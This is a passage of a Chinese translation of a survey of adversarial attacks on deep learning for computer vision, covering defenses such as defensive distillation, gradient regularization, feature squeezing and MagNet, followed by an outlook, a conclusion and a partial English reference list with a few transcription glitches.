Xie等人[115]表明，随机调整敌对例子的大小会降低其有效性。此外，在这些示例中添加随机填充也可以降低网络的欺骗率。Wang等人[138]用一个单独的数据转换模块转换输入数据，以消除图像中可能的敌对干扰。在文献中，我们还发现有证据表明，训练期间的数据增强（例如，高斯数据增强[46]）也有助于提高神经网络对敌对攻击的鲁棒性，尽管这一点很小。 ¶6.2 Modifying the network ​ 对于修改神经网络以抵御对手攻击的方法，我们首先讨论了“完全防御”方法。“仅检测”方法在第6.2.8节中单独进行了审查。 ¶6.2.1 Deep Contractive Networks【深度收缩网络】 ​ 在使深度学习对对抗性攻击具有鲁棒性的早期尝试中，Gu和Rigazio[24]引入了深度收缩网络（DCN）。结果表明，去噪自动编码器[154]可以减少对抗性噪声，但是将其与原始网络叠加可以使生成的网络更容易受到干扰。基于这一观察，DCNs的训练过程使用了类似于压缩自动编码器的平滑度惩罚[173]。自从DCNs最初被提出以来，已经引入了许多更强的攻击。使用自动编码器实现神经网络对抗鲁棒性的相关概念也可以在[141]中找到。 ¶6.2.2 Gradient regularization/masking 【梯度正则化/掩蔽】 ​ Ross和Doshi Velez[52]研究了输入梯度正则化[167]作为对抗鲁棒性的一种方法。他们的方法训练可微模型（例如深层神经网络），同时根据输入的变化惩罚导致输出的变化程度。这意味着，一个小的对抗性扰动不太可能彻底改变训练模型的输出。结果表明，该方法与暴力对抗训练相结合，对FGSM[23]和JSMA[60]等攻击具有很好的鲁棒性。然而，这些方法中的每一种都几乎使网络的训练复杂度增加了一倍，这在许多情况下都是不可行的。 ​ 此前，Lyu等人[28]还使用了将网络模型的损失函数梯度与输入相关的概念，以结合网络对基于L-BFGS[22]和FGSM[23]的攻击的鲁棒性。类似地，Shaham等人[27]试图通过在每次参数更新时最小化模型在对抗性示例中的损失来提高神经网络的局部稳定性。他们用最坏情况下的对抗性例子而不是原始数据来最小化模型的损失。在一项相关的工作中，Nguyen和Sinha[44]通过在网络的logit输出中添加噪声，引入了一种基于掩蔽的防御C&amp;W攻击的方法[36]。 ¶6.2.3 Defensive distillation 【防御蒸馏】 ​ Papernot等人[38]利用了“蒸馏”的概念[166]，使得深层神经网络能够抵御对手的攻击。Hinton等人[166]引入蒸馏作为一种训练过程，将更复杂网络的知识转移到更小的网络中。Papernot等人[38]引入的程序变体本质上是利用网络的知识来提高自身的健壮性。以训练数据的类概率向量的形式提取知识，并反馈训练原始模型。结果表明，这样做可以提高网络对图像小扰动的恢复能力。[108]中也提供了这方面的进一步经验证据。此外，在后续工作中，Papernot等人[84]还通过解决[38]中遇到的数值不稳定性，扩展了防御蒸馏方法。值得注意的是，第3.1节中介绍的“卡里尼和瓦格纳”（C&amp;W）攻击[36]被认为是成功对抗防御蒸馏技术的。我们还注意到，防御蒸馏也可以看作是“梯度掩蔽”技术的一个例子。然而，鉴于其在文献中的流行性，我们将其单独描述。 ¶6.2.4 Biologically inspired protection ​ Nayebi和Ganguli[124]证明了神经网络对具有高度非线性激活的对抗性攻击的自然鲁棒性（类似于非线性树突计算）。Nayebi和Ganguli[124]证明了神经网络对具有高度非线性激活的对抗性攻击具有自然鲁棒性（类似于非线性树突计算） ​ Krotov和Hopfield[127]的记忆模型也采用了类似的原理来抵抗对抗性例子。考虑到Goodfel-low等人[23]、[124]和[127]的线性假设，现代神经网络对对抗性例子的敏感性似乎是激活线性效应的概念得到了进一步的发展。我们注意到，Brendel和Bethge[187]声称，由于计算的数值限制，这些攻击在生物启发保护（Biologically inspired protection）[124]上攻击失败。稳定计算（Stabilizing the computations）再次成功攻击受保护的网络。 ¶6.2.5 Parseval Networks ​ 西塞等人[131]提出了“Parseval”网络作为对抗性攻击的防御。这些网络通过控制网络的全局Lipschitz常数采用分层正则化。考虑到一个网络可以被看作是一个函数的组合（在每一层），通过为这些函数保持一个小的Lipschitz常数，可以对小的输入扰动进行鲁棒性处理。Cisse等人提出通过用“parseval紧框架”参数化网络的权重矩阵来控制其谱范数[172]，因此命名为“parseval”网络。 ¶6.2.6 DeepCloak Gao等人[139]建议在处理分类的层之前插入一个掩蔽层。添加的层通过向前传递干净的和敌对的一对图像进行显式训练，并对这些图像对的前一层的输出特征之间的差异进行编码。有人认为，添加层中最主要的权重对应于网络中最敏感的特征（就对抗性操纵而言）。因此，在分类时，这些特征通过强制将添加层的主要权重设为零来掩盖。 ¶6.2.7 Miscellaneous approaches Zantedeschi等人[46]提出使用有界ReLU[174]来降低图像中敌对模式的有效性，这是使神经网络对敌对攻击具有鲁棒性的其他显著努力之一。Jin等人[120]介绍了一种前馈CNN，它使用加性噪声来减轻对抗性例子的影响。Sun等人[56]提出了“超网络”，它使用统计滤波作为一种方法，使网络健壮。Madry等人[55]从稳健优化的角度研究了对抗性防御。他们表明，与PGD对手进行对抗性训练可以成功地防御一系列其他对手。后来，卡里尼等人[59]也证实了这一观察结果。Na等人[85]采用了一种网络，该网络通过统一的嵌入进行正则化，用于分类和低水平的相似性学习。利用干净嵌入和相应的敌对嵌入之间的距离对网络进行惩罚。斯特劳斯等人[89]研究了一系列方法来保护网络免受干扰。Kadran等人[136]修改了神经网络的输出层，以增强对抗性攻击的鲁棒性。 Wang等人[129]，[122]通过利用网络中的不可逆数据转换开发了可以抵抗神经对抗样本的神经网络。Lee等人[106]开发了多种规则化网络，使用训练目标最小化干净图像和敌对图像的多层嵌入结果之间的差异。Kotler和Wong[96]提出学习基于ReLU的分类器，该分类器对小的对抗性扰动具有鲁棒性。他们训练的神经网络达到高精度（&gt; 90%）对抗规范环境中的任何对抗样本（ℓ∞&quot;\\ell_{\\infty}&quot;ℓ∞​&quot;，在MNIST数据集当中）。Raghunathan等人[189]研究了具有一个隐藏层的神经网络的防御问题。他们的方法在MNIST数据集上生成了一个网络和一个证书，使得对图像像素的干扰不超过ε=0.1的攻击都不会导致超过35%的测试错误。Kolter和Wong[96]以及Raghunathan等人[189]是为数不多的防御敌对攻击的可证明方法。考虑到这些方法在计算上不适用于更大的网络，唯一被广泛评估的防御措施是Madry等人[55]的防御措施，在MNIST上对大epsilon（0.3/1）的准确率为89%，在CIFAR上对中等epsilon（8/255）的准确率为45%。另一个可以被视为具有保证的对抗性攻击/防御的工作线索与深度神经网络的验证有关，例如[191]，[192]。OrOrbia等人[194]的研究表明，对抗性训练的许多不同建议是更普遍的正规化目标实例，他们称之为DataGrad。提出的DataGrad框架可以看作是分层压缩自编码惩罚的扩展。 ¶6.2.8 Detection Only approaches SafetyNet: Lu等人[66]假设，对抗性的例子在网络（后期）中产生的ReLU激活模式与干净图像产生的模式不同。基于这一假设，他们提出在目标模型上附加一个径向基函数SVM分类器，使得SVM使用由网络后期ReLUs计算的离散码。为了检测测试图像中的扰动，使用支持向量机将其编码与训练样本的编码进行比较。由[23]、[35]、[72]生成的对抗性示例的有效检测通过其框架SafetyNet进行了证明。 Detector subnetwork: Metzen等人[78]提出用一个子网来增强目标网络，该子网被训练用于检测输入中的敌对扰动的二进制分类任务。研究表明，将这样的网络附加到模型的内部层并使用对抗性训练有助于检测使用FGSM[23]、BIM[35]和DeepFool[72]方法产生的扰动。然而，Lu等人[66]后来表明，这种方法同样容易受到反措施的影响。 Exploiting convolution filter statistics: Li和Li[105]利用基于CNN的神经网络中卷积滤波器的统计特性将输入图像分类为干净的或敌对的。利用这些统计量设计了一个级联分类器，并对文献[22]、[114]中方法生成的85%以上的对抗性图像进行了检测。 Additional class augmentation: Grosse等人[57]提出用一个额外的类来增强潜在的目标神经网络模型，在这个类中，模型被训练来分类所有的对抗性例子。Hosseini等人[32]也采用了类似的策略来检测黑匣子攻击。 ¶6.3 Network add-ons ¶6.3.1 Defense against universal perturbations Akhtar等人[81]提出了一个防御框架，以抵抗使用普遍扰动产生的对抗性攻击[16]。该框架将额外的“预输入”层附加到目标网络中，并训练它们校正每一个turbed图像，以便分类器的预测与对同一图像的干净版本的预测相同。预输入层称为扰动校正网络（PRN），在不更新目标网络参数的情况下对其进行训练。通过从训练图像的PRN输入-输出差异中提取特征来训练单独的检测器。测试图像首先通过PRN，然后利用其特征检测扰动。如果检测到对抗性干扰，则使用PRN的输出对测试图像进行分类。图10示出了由PRN执行的校正。对去除的模式分别进行检测分析。 ¶6.3.2 GAN-based defense ​ Lee等人[101]使用流行的生成性对抗网络框架[153]来训练对FGSM[23]类攻击具有鲁棒性的网络。作者建议直接沿着generator network训练网络，试图为该网络产生扰动。在训练过程中，分类器不断尝试正确分类干净的和受干扰的图像。我们将此技术归类为“附加”方法，因为作者建议始终以这种方式训练任何网络。在另一个基于GAN的防御中，Shen等人[58]使用网络的生成器部分来校正扰动图像。 ¶6.3.3 Detection Only approaches Feature squeezing: Xu等人[43]提出利用特征压缩来检测图像的对抗性扰动。他们将两个外部模型添加到分类器网络中，这样这些模型可以减少图像中每个像素的颜色位深度，并对图像进行空间平滑。比较了目标网络对原始图像和压缩图像的预测。如果预测结果之间存在较大差异，则该图像被认为是一个对抗性的例子。尽管[43]证明了这种方法对更经典的攻击的有效性[23]，但后续工作[140]也声称该方法对更强大的C&amp;W攻击的效果相当好[36]。他等人[76]还将特征压缩与[175]中提出的系综方法相结合，以表明防御的强度并不总是通过组合它们而增加。 MagNet: Meng和Chen[45]提出了一个框架，该框架使用一个或多个外部探测器将输入图像分类为敌对或干净。在训练过程中，该框架旨在学习多种清晰图像。在测试阶段，发现远离流形的图像被视为对抗性的，并被拒绝。靠近流形（但不完全在流形上）的图像总是被重组为位于流形上，并且分类器被送入重组后的图像。将附近的图像吸引到干净图像的流形中，并将远处的图像丢弃的概念也启发了框架的名称，即磁铁。值得注意的是，卡里尼和瓦格纳（Carlini and Wagner）[188]最近证明，这种防御技术也可以在稍大的扰动下被击败。 **其他方法：**Liang等人[50]将图像的扰动视为噪声，并使用标量量化和空间平滑滤波器分别检测这些扰动。在一个相关的方法中，Feinman等人[86]提出通过利用不确定性估计（of dropout neural networks）和在神经网络的特征空间中执行密度估计来检测对抗性扰动。最后，利用所提出的特征，将单独的二值分类器训练成多示例检测器。Gebhart和Schrater[92]将神经网络计算视为图中的信息流，提出了一种通过对诱导图应用持久同调来检测对抗性扰动的方法。 ¶7 OUTLOOK OF THE RESEARCH DIRECTION ​ 在前面的几节中，我们全面回顾了最近关于对抗性攻击深度学习的文献。尽管在技术细节的这些部分中报告了一些有趣的事实，但下面我们将对这一新兴研究方向进行更一般性的观察。在没有深入了解这一领域的技术知识的情况下，讨论为读者提供了更广阔的前景。我们的论点是基于上述文献。 **这种威胁是真实存在的：**虽然很少有研究表明，对抗性攻击深度学习可能不是一个严重的问题，但大量相关文献表明并非如此。在第3节和第4节中回顾的文献清楚地表明，对抗性攻击可以严重降低深度学习技术在多个计算机视觉任务上的性能。特别是，第4节回顾的文献确定，在现实世界中，深度学习容易受到对抗性攻击。因此，我们可以得出结论，对抗性攻击对实践中的深度学习构成了真正的威胁。 **对抗性脆弱性是一种普遍现象：**文献回顾表明，在计算机视觉中，不同类型的深层神经网络（如MLPs、CNNs、RNNs）在识别、分割、检测等多种任务上都被成功地愚弄。尽管现有的研究大多集中于在分类/识别任务上愚弄深度学习，但根据调查的文献，我们可以很容易地观察到，深度学习方法通常容易受到对手攻击。 对抗性例子通常具有很好的泛化性：文献中所报道的对抗性例子的一个最常见的特性是它们在不同的神经网络之间有很好的传递。对于架构相对相似的网络来说尤其如此。在黑盒攻击中，对抗性例子的推广经常被利用。 **对抗性脆弱性的原因需要更多的研究：**关于深层神经网络对微妙的对抗性扰动的脆弱性背后的原因，文献中有不同的观点。通常情况下，这些观点并不完全一致。这方面显然需要进行系统的调查。 **线性确实促进了脆弱性：**Goodfello等人[23]首先提出，现代深层神经网络的设计迫使它们在高维空间中线性行为，也使它们容易受到对手的攻击。虽然这一概念很流行，但在文献中也遭到了一些反对。我们的调查指出，多个独立的贡献，保持神经网络的线性负责他们的脆弱性对抗性攻击。基于这一事实，我们可以说，线性确实促进了深层神经网络对对手攻击的脆弱性。然而，这似乎不是用廉价的分析扰动就成功愚弄深层神经网络的唯一原因。 **反措施是可能的：**尽管存在多种防御技术来对抗对抗对手的攻击，但文献中经常显示，通过设计反措施，可以再次成功地攻击被防御的模型，例如[49]。这一观察结果需要新的防御措施也提供一个对明显的反措施的鲁棒性估计。 高度活跃的研究方向： 深层神经网络对一般扰动的脆弱性的深刻暗示使得对抗性攻击及其防御的研究近年来非常活跃。在这项调查中回顾的大多数文献都是在过去两年中出现的，目前这方面的贡献源源不断。一方面，人们提出了一些技术来保护神经网络免受已知的攻击，另一方面，越来越多的强大的攻击被设计出来。最近，还组织了一次卡格尔竞赛。我们希望，这项高水平的研究活动最终会使深度学习方法足够强大，能够用于现实世界中的安全和安保关键应用。 ¶8 CONCLUSION 本文首次全面综述了计算机视觉深度学习对抗性攻击的发展方向。尽管深度神经网络在各种各样的计算机视觉任务中具有很高的精度，但人们发现它们容易受到细微的输入扰动的影响，从而导致它们完全改变其输出。由于深度学习是当前机器学习和人工智能发展的核心，这一发现导致了许多设计对抗性攻击及其深度学习防御的最新贡献。本文回顾了这些贡献，主要集中在最有影响和最有趣的作品在文学。从回顾的文献来看，对抗性攻击显然是对实践中深入学习的真正威胁，尤其是在安全和安保关键应用中。现有文献表明，目前的深度学习不仅可以在网络空间中有效地攻击，而且可以在物理世界中有效地攻击。然而，由于这一研究方向的高度活跃性，可以希望深度学习能够在未来显示出相当强的对抗对手攻击的鲁棒性。 ¶REFERENCES 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217[1] Y. LeCun, Y. Bengio and G. Hinton, Deep learning, Nature, vol. 521, no. 7553, pp. 436-444, 2015.[2] M.Helmstaedter,K.L.Briggman,S.C.Turaga,V.Jain,H.S.Seung, and W. Denk, Connectomic reconstruction of the inner plexiform layer in the mouse retina. Nature, vol. 500, no. 7461, pp. 168-174, 2013.[3] H. Y. Xiong, B. Alipanahi, J. L. Lee, H. Bretschneider, D. Merico, R. K. Yuen, and Q. Morris, The human splicing code reveals new insights into the genetic determinants of disease, Science, vol. 347, no. 6218, 1254806 2015.[4] J.Ma,R.P.Sheridan,A.Liaw,G.E.DahlandV.Svetnik,Deepneural nets as a method for quantitative structure-activity relationships, Journal of chemical information and modeling, vol. 55, no. 2 pp. 263-274, 2015.[5] T. Ciodaro, D. Deva, J. de Seixas and D. Damazio, Online particle detection with neural networks based on topological calorimetry infor- mation. Journal of physics: conference series. vol. 368, no. 1. IOP Publishing, 2012.[6] Kaggle. Higgs boson machine learning challenge. Kaggle https:&#x2F;&#x2F; www.kaggle.com&#x2F;c&#x2F;higgs-boson, 2014.[7] G. Hinton, L. Deng, D. Yu, G. E. Dahl, A. R. Mohamed, N. Jaitly, and B. Kingsbury, Deep neural networks for acoustic modeling in speech recognition: The shared views of four research groups, IEEE Signal Processing Magazine, vol. 29, no. 6, pp. 82-97, 2012.[8] I. Sutskever, O. Vinyals, and Q. V. Le, Sequence to sequence learning with neural networks. In Advances in neural information processing systems, pp. 3104-3112, 2014.[9] A. Krizhevsky, I. Sutskever and G. E. Hinton, Imagenet classification with deep convolutional neural networks. In Advances in neural infor- mation processing systems, pp. 1097-1105, 2012.[10] Y. LeCun, B. Boser, J. S. Denker, D. Henderson, R. E. Howard, W. Hubbard and L. D. Jackel, Backpropagation applied to handwritten zip code recognition. Neural computation, vol. 1m no. 4, pp. 541-551, 1989.[11] J. Deng, W. Dong, R. Socher, L. J. Li, K. Li, and L. Fei-Fei, Imagenet: A large-scale hierarchical image database. In IEEE Conference on Computer Vision and Pattern Recognition, pp. 248-255, 2009.[12] E. Ackerman, How Drive.ai is mastering au- tonomous driving with deep learning, https:&#x2F;&#x2F;spectrum. ieee.org&#x2F;cars- that- think&#x2F;transportation&#x2F;self- driving&#x2F;how- driveai- is- mastering- autonomous- driving- with- deep- learning, Accessed December 2017.[13] M. M. Najafabadi, F. Villanustre, T. M. Khoshgoftaar, N. Seliya, R. Wald and E. Muharemagic, Deep learning applications and challenges in big data analytics, Journal of Big Data, vol. 2, no. 1, 2015.[14] D. Silver, J. Schrittwieser, K. Simonyan, I. Antonoglou, A. Huang, A. Guez, Y. Chen, Mastering the game of go without human knowledge. Nature, vol. 550, no. 7676, pp. 354-359, 2017.[15] K. He, X. Zhang, S. Ren, J. Sun, Deep residual learning for image recognition. In Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 770-778, 2016.[16] S. M. Moosavi-Dezfooli, A. Fawzi, O. Fawzi and P. Frossard, Uni- versal adversarial perturbations. In Proceedings of IEEE Conference on Computer Vision and Pattern Recognition (CVPR), 2017.[17] K. Chatfield, K. Simonyan, A. Vedaldi, A. Zisserman, Return of the devil in the details: Delving deep into convolutional nets, arXiv preprint arXiv:1405.3531, 2014.[18] C. Szegedy, W. Liu, Y. Jia, P. Sermanet, S. Reed, D. Anguelov, A. Rabinovich, Going deeper with convolutions. In Proceedings of the IEEE conference on computer vision and pattern recognition, pp. 1-9, 2015.[19] J. Lu, H. Sibai, E. Fabry, D. Forsyth, Standard detectors aren’t (currently) fooled by physical adversarial stop signs, arXiv preprint arXiv:1710.03337, 2017.[20] R. Fletcher, Practical methods of optimization, John Wiley and Sons, 2013.[21] A. Esteva, B. Kuprel, R. A. Novoa, J. Ko, S. M. Swetter, H. M. Blau, S. Thrun, Dermatologist-level classification of skin cancer with deep neural networks, Nature, vol. 542, pp. 115 - 118, 2017.[22] C. Szegedy, W. Zaremba, I. Sutskever, J. Bruna, D. Erhan, I. Goodfellow, R. Fergus, Intriguing properties of neural networks, arXiv preprint arXiv:1312.6199, 2014.[23] I. J. Goodfellow, J. Shlens, C. Szegedy, Explaining and Harnessing Adversarial Examples, arXiv preprint arXiv:1412.6572, 2015.[24] S.Gu,L.Rigazio,TowardsDeepNeuralNetworkArchitecturesRobust to Adversarial Examples, arXiv preprint arXiv:1412.5068, 2015[25] P. Tabacof, E. Valle, Exploring the Space of Adversarial Images, In IEEE International Joint Conference on Neural Networks, pp. 426- 433, 2016.[26] S.Sabour,Y.Cao,F.Faghri,andD.J.Fleet,Adversarialmanipulation of deep representations, arXiv preprint arXiv:1511.05122, 2015.[27] U. Shaham, Y. Yamada, S. Negahban, Understanding Adversarial Training: Increasing Local Stability of Neural Nets through Robust Optimization, arXiv preprint arXiv:1511.05432, 2016.[28] C. Lyu, K. Huang, H. Liang, A Unified Gradient Regularization Family for Adversarial Examples, In IEEE International Conference on Data Mining, pp. 301-309, 2015.[29] I. Evtimov, K. Eykholt, E. Fernandes, T. Kohno, B. Li, A. Prakash, A. Rahmati, D. Song, Robust Physical-World Attacks on Deep Learning Models, arXiv preprint arXiv:1707.08945, 2017.[30] J. Lu, H. Sibai, E. Fabry, D. Forsyth, No need to worry about adversarial examples in object detection in autonomous vehicles, arXiv preprint arXiv:1707.03501, 2017.[31] Y. Liu, W. Zhang, S. Li, N. Yu, Enhanced Attacks on Defensively Distilled Deep Neural Networks, arXiv preprint arXiv:1711.05934, 2017.[32] H. Hosseini, Y. Chen, S. Kannan, B. Zhang, R. Poovendran, Block- ing transferability of adversarial examples in black-box learning systems, arXiv preprint arXiv:1703.04318, 2017.[33] T. Gu, B. Dolan-Gavitt, S. Garg, BadNets: Identifying Vulnerabil- ities in the Machine Learning Model Supply Chain. arXiv preprint arXiv:1708.06733, 2017.[34] N. Papernot, P. McDaniel, A. Sinha, M. Wellman, Towards the Science of Security and Privacy in Machine Learning, arXiv preprint arXiv:1611.03814, 2016.[35] A. Kurakin, I. Goodfellow, S. Bengio, Adversarial examples in the physical world, arXiv preprint arXiv:1607.02533, 2016.[36] N. Carlini, D. Wagner, Towards Evaluating the Robustness of Neural Networks, arXiv preprint arXiv:1608.04644, 2016.[37] N. Das, M. Shanbhogue, S. Chen, F. Hohman, L. Chen, M. E. Kounavis, D. H. Chau, Keeping the Bad Guys Out: Protecting and Vaccinating Deep Learning with JPEG Compression, arXiv preprint arXiv:1705.02900, 2017.\\[38] N. Papernot, P. McDaniel, X. Wu, S. Jha, A. Swami, Distillation as a Defense to Adversarial Perturbations against Deep Neural Networks, In IEEE Symposium on Security and Privacy (SP), pp. 582-597, 2016.[39] N. Papernot, P. McDaniel, I. Goodfellow, S. Jha, Z. B. Celik, A. Swami, Practical Black-Box Attacks against Machine Learning, In Proceedings of the ACM on Asia Conference on Computer and Communications Security, pp. 506-519. ACM, 2017.[40] X. Xu, X. Chen, C. Liu, A. Rohrbach, T. Darell, D. Song, Can you fool AI with adversarial examples on a visual Turing test?, arXiv preprint arXiv:1709.08693, 2017[41] P. Chen, H. Zhang, Y. Sharma, J. Yi, C. Hsieh, ZOO: Zeroth Order Optimization based Black-box Attacks to Deep Neural Networks without Training Substitute Models, In Proceedings of 10th ACM Workshop on Artificial Intelligence and Security (AISEC), 2017.[42] S. Baluja, I. Fischer, Adversarial Transformation Networks: Learning to Generate Adversarial Examples, arXiv preprint arXiv:1703.09387, 2017. [43] W. Xu, D. Evans, Y. Qi, Feature Squeezing: Detecting Adversarial Examples in Deep Neural Networks, arXiv preprint arXiv:1704.01155,2017.[44] L. Nguyen, A. Sinha, A Learning and Masking Approach to Secure Learning, arXiv preprint arXiv:1709.04447, 2017.[45] Dongyu Meng, Hao Chen, MagNet: a Two-Pronged Defense against Adversarial Examples, In Proceedings of ACM Conference on Computer and Communications Security (CCS), 2017.[46] V. Zantedeschi, M. Nicolae, A. Rawat, Efficient Defenses AgainstAdversarial Attacks, arXiv preprint arXiv:1707.06728, 2017.[47] J. Hayes, G. Danezis, Machine Learning as an Adversarial Ser- vice: Learning Black-Box Adversarial Examples, arXiv preprint arXiv:1708.05207, 2017.[48] A. Graese, A. Rozsa, T. E. Boult, Assessing Threat of Adversarial Examples on Deep Neural Networks, In IEEE International Conference on Machine Learning and Applications, pp. 69-74, 2016.[49] N. Carlini, D. Wagner, Adversarial Examples Are Not Easily Detected: Bypassing Ten Detection Methods, arXiv preprint arXiv:1705.07263, 2017.[50] B. Liang, H. Li, M. Su, X. Li, W. Shi, X. Wang, Detecting Adversarial Examples in Deep Networks with Adaptive Noise Reduction, arXiv preprint arXiv:1705.08378, 2017.[51] A. Arnab, O. Miksik, P. H. S. Torr, On the Robustness of Se-mantic Segmentation Models to Adversarial Attacks, arXiv preprint arXiv:1711.09856, 2017.[52] A. S. Ross, F. Doshi-Velez, Improving the Adversarial Robustness and Interpretability of Deep Neural Networks by Regularizing their Input Gradients, arXiv preprint arXiv:1711.09404, 2017.[53] Y. Song, T. Kim, S. Nowozin, S. Ermon, N. Kushman, PixelDefend:Leveraging Generative Models to Understand and Defend against Adver-sarial Examples, arXiv preprint arXiv:1710.10766, 2017.[54] N. Narodytska, S. P. Kasiviswanathan, Simple Black-Box Adversarial Perturbations for Deep Networks, arXiv preprint arXiv:1612.06299,2016.[55] A. Madry, A. Makelov, L. Schmidt, D. Tsipras, A. Vladu, Towards Deep Learning Models Resistant to Adversarial Attacks, arXiv preprint arXiv:1706.06083, 2017.[56] Z. Sun, M. Ozay, T. Okatani, HyperNetworks with statistical filtering for defending adversarial examples, arXiv preprint arXiv:1711.01791, 2017.[57] K. Grosse, P. Manoharan, N. Papernot, M. Backes, P. McDaniel, On the (Statistical) Detection of Adversarial Examples, arXiv preprint arXiv:1702.06280, 2017.[58] S. Shen, G. Jin, K. Gao, Y. Zhang, APE-GAN: Adversarial Perturba- tion Elimination with GAN, arXiv preprint arXiv:1707.05474, 2017.[59] N. Carlini, G. Katz, C. Barrett, D. L. Dill, Ground-Truth Adversarial Examples, arXiv preprint arXiv:1709.10207, 2017.[60] N. Papernot, P. McDaniel, S. Jha, M. Fredrikson, Z. B. Celik, A. Swami, The Limitations of Deep Learning in Adversarial Settings, In Proceedings of IEEE European Symposium on Security and Privacy, 2016.[61] K. Grosse, N. Papernot, P. Manoharan, M. Backes, P. McDaniel, Adversarial Perturbations Against Deep Neural Networks for Malware Classification, arXiv preprint arXiv:1606.04435, 2016.[62] S. Huang, N. Papernot, I. Goodfellow, Y. Duan, P. Abbeel, Adversarial Attacks on Neural Network Policies, arXiv preprint arXiv:1702.02284, 2017.[63] M. Melis, A. Demontis, B. Biggio, G. Brown, G. Fumera, F. Roli, Is Deep Learning Safe for Robot Vision? Adversarial Examples against the iCub Humanoid, arXiv preprint arXiv:1708.06939, 2017.[64] I. Rosenberg, A. Shabtai, L. Rokach, Y. Elovici, Generic Black-Box End-to-End Attack against RNNs and Other API Calls Based Malware Classifiers, arXiv preprint arXiv:1707.05970, 2017.[65] A. Athalye, L. Engstrom, A. Ilyas, K. Kwok, Synthesizing Robust Adversarial Examples, arXiv preprint arXiv:1707.07397, 2017.[66] J. Lu, T. Issaranon, D. Forsyth, SafetyNet: Detecting and Rejecting Adversarial Examples Robustly, arXiv preprint arXiv:1704.00103, 2017.[67] J. H. Metzen, M. C. Kumar, T. Brox, V. Fischer Universal Adversarial Perturbations Against Semantic Image Segmentation, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2755-2764, 2017.[68] J. Su, D. V. Vargas, S. Kouichi, One pixel attack for fooling deep neural networks, arXiv preprint arXiv:1710.08864, 2017.[69] A. Fawzi, S. Moosavi-Dezfooli, P. Frossard, Robustness of classifiers:from adversarial to random noise, In Advances in Neural Information Processing Systems, pp.1632-1640, 2016.[70] S.Moosavi-Dezfooli, A. Fawzi, O.Fawzi, P. Frossard, SSoatto, Analysis of universal adversarial perturbations, arXiv preprint arXiv:1705.09554, 2017.[71] A. Fawzi, O. Fawzi, P. Frossard, Analysis of classifiers’ robustness toadversarial perturbations, arXiv preprint arXiv:1502.02590, 2015.[72] S. Moosavi-Dezfooli, A. Fawzi, P. Frossard, DeepFool: a simple and accurate method to fool deep neural networks, In Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition, pp.2574-2582, 2016.[73] C. Kanbak, SS. Moosavi-Dezfooli, P. Frossard, Geometric robustness of deep networks: analysis and improvement, arXiv preprint arXiv:1711.09115, 2017.[74] T. Tanay, L. Griffin, A Boundary Tilting Persepective on the Phenomenon of Adversarial Examples, arXiv preprint arXiv:1608.07690,2016.[75] I. Evtimov, K. Eykholt, E. Fernandes, T. Kohno, B. Li, A. Prakash,A. Rahmati, D. Song, Robust Physical-World Attacks on Deep Learning Models, arXiv preprint arXiv:1707.08945, 2017[76] W. He, J. Wei, X. Chen, N. Carlini, D. Song, Adversarial Example Defenses: Ensembles of Weak Defenses are not Strong, arXiv preprint arXiv:1706.04701, 2017.[77] F. Tramer, A. Kurakin, N. Papernot, D. Boneh, P. McDaniel,Ensemble Adversarial Training: Attacks and Defenses, arXiv preprint arXiv:1705.07204, 2017.[78] J. H. Metzen, T. Genewein, V. Fischer, B. Bischoff, On Detecting Adversarial Perturbations, arXiv preprint arXiv:1702.04267, 2017. [79] C. Xie, J. Wang, Z.Zhang, Z. Ren, A. Yuille, Mitigating adversarial effects through randomization, arXiv preprint arXiv:1711.01991, 2017. [80] A. Kurakin, I. Goodfellow, S. Bengio, Adversarial Machine Learning at Scale, arXiv preprint arXiv:1611.01236, 2017.[81] N. Akhtar, J. Liu, A. Mian, Defense against Universal Adversarial Perturbations, arXiv preprint arXiv:1711.05929, 2017.[82] C. Guo, M. Rana, M. Cisse, L. Maaten, Countering Adversarial Images using Input Transformations, arXiv preprint arXiv:1711.00117,2017.[83] A. Galloway, G. W. Taylor, M. Moussa, Attacking Binarized Neural Networks, arXiv preprint arXiv:1711.00449, 2017.[84] N. Papernot, P. McDaniel, Extending Defensive Distillation, arXiv preprint arXiv:1705.05264, 2017.[85] T. Na, J. H. Ko, S. Mukhopadhyay, Cascade Adversarial Machine Learning Regularized with a Unified Embedding, arXiv preprint arXiv:1708.02582, 2017.[86] R. Feinman, R. R. Curtin, S. Shintre, A. B. Gardner, Detecting Adversarial Samples from Artifacts, arXiv preprint arXiv:1703.00410, 2017.[87] X. Zeng, C. Liu, Y. Wang, W. Qiu, L. Xie, Y. Tai, C. K. Tang, A. L. Yuille, Adversarial Attacks Beyond the Image Space, arXiv preprint arXiv:1711.07183, 2017.[88] Y. Liu, X. Chen, C. Liu, D. Song, Delving into Transferable Adversarial Examples and Black-box Attacks, arXiv preprint arXiv:1611.02770, 2017.[89] T. Strauss, M. Hanselmann, A. Junginger, H. Ulmer, Ensemble Methods as a Defense to Adversarial Perturbations Against Deep Neural Networks, arXiv preprint arXiv:1709.03423, 2017.[90] S. Sankaranarayanan, A. Jain, R. Chellappa, S. N. Lim, Regulariz- ing deep networks using efficient layerwise adversarial training, arXiv preprint arXiv:1705.07819, 2017.[91] E. D. Cubuk, B. Zoph, S. S. Schoenholz, Q. V. Le, Intriguing Properties of Adversarial Examples, arXiv preprint arXiv:1711.02846, 2017.[92] T. Gebhart, P. Schrater, Adversary Detection in Neural Networks via Persistent Homology, arXiv preprint arXiv:1711.10056, 2017.[93] J. Bradshaw, A. G. Matthews, Z. Ghahramani, Adversarial Examples, Uncertainty, and Transfer Testing Robustness in Gaussian Process Hybrid Deep Networks, arXiv preprint arXiv:1707.02476, 2017.[94] A. Rozsa, E. M. Rudd, T. E. Boult, Adversarial Diversity and Hard Positive Generation, arXiv preprint arXiv:1605.01775, 2016.[95] O. Bastani, Y. Ioannou, L. Lampropoulos, D. Vytiniotis, A. Nori, A. Criminisi, Measuring Neural Net Robustness with Constraints, arXiv preprint arXiv:1605.07262, 2017.[96] J. Z. Kolter, E. Wong, Provable defenses against adversarial ex- amples via the convex outer adversarial polytope, arXiv preprint arXiv:1711.00851, 2017.[97] A. Rozsa, M. Geunther, T. E. Boult, Are Accuracy 